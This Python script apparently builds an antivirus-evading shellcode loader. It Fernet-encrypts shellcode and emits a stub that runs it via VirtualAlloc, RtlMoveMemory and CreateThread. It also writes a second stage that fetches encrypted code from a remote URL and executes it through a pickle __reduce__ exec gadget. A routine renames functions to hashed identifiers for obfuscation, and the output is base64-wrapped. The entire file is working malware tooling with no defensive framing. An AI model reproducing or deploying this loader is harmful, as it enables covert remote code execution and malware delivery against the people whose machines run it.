# -*- coding: utf-8 -*-

import base64
import re,os,time
from cryptography.fernet import Fernet

shellcode = b""
url=''
key = Fernet.generate_key()
fernet = Fernet(key)
enstr = fernet.encrypt(shellcode)
key2 = Fernet.generate_key()
fernet2 = Fernet(key2)
a=f'''
import ctypes
from cryptography.fernet import Fernet
KEY={key}
fernet=Fernet(KEY)
shellcode=fernet.decrypt({enstr})

shellcode = bytearray(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
'''

cccc=f'''
from cryptography.fernet import Fernet
import pickle,base64,requests,ctypes
import random
url=f'{url}'
a=[]
class B():
    def cc(self):
        for i in range(5):
            a.append(i)

def O7303771(sectr):
    global destr
    KEY={key2}
    fernet = Fernet(KEY)
    destr = fernet.decrypt(sectr).decode()
    aaa(destr)

def aaa(destr):
    class A(object):
        def __reduce__(self):
            return (exec, (destr,))
        def O6294286(self):
            exec(bbb)
    a=A()
    a.O6294286()
    ret = pickle.dumps(a)
    ret_base64 = base64.b64encode(ret)
    ret_decode = base64.b64decode(ret_base64)
    pickle.loads(ret_decode)

bbb ="""
for i in range(100):
    aaa=B()
    aaa.cc()
   """

def O0135984():
    try:
        r=requests.get(url)
        a = r.status_code
    except:
        a = 404
        pass

    if a == 200:
        O7303771(r.text)
    else:
        pass
if __name__ == '__main__':
    O0135984()
'''

def hunxiao():
    openfile = 'content.txt'
    text = open(openfile, encoding='utf-8').read()
    wd_df = re.findall("def (.*?)\\(", text)
    wd_df = list(set(wd_df))
    for i in wd_df:
        if i[0:2] == "__":
            wd_df.remove(i)
        if i == 'super':
            wd_df.remove(i)
    idlist = []
    for i in wd_df:
        idlist.append('O' + str(hash(i))[-7:])

    cs = len(wd_df)
    if cs == len(set(idlist)):
        while cs > 0:
            cs -= 1
            text = text.replace(wd_df[cs] + '(', idlist[cs] + '(')
            text = text.replace('target=' + wd_df[cs], 'target=' + idlist[cs])
            text = text.replace('global ' + wd_df[cs], 'global ' + idlist[cs])
            text = text.replace(', ' + wd_df[cs], ', ' + idlist[cs])
    else:
        print('hash repeat')

    file_save = open('b.py', 'w', encoding='utf-8')
    file_save.write(text)
    file_save.close()

with open('content.txt', 'bw') as f:
    f.write(cccc.encode())
    hunxiao()

with open('a.txt', 'bw') as f:
    f.write(fernet2.encrypt(a.encode()))

with open('content.txt', 'br') as f:
    content=base64.b64encode(f.read())

b = f'''
from cryptography.fernet import Fernet
import pickle,base64,requests,ctypes
import random
cccc={content}
exec(base64.b64decode(cccc).decode())
'''

with open('b.py', 'w', encoding='utf-8') as f:
    f.write(b)

iconame=f'{int (time.time() *1000)}.ico'
with open('coleak.ico',"br") as f:
    cont=f.read()
with open(f'{iconame}',"bw") as f:
    cont+=iconame.encode()
    f.write(cont)
with open('create.py',"br") as f:
    createit=f.read()
exec(createit)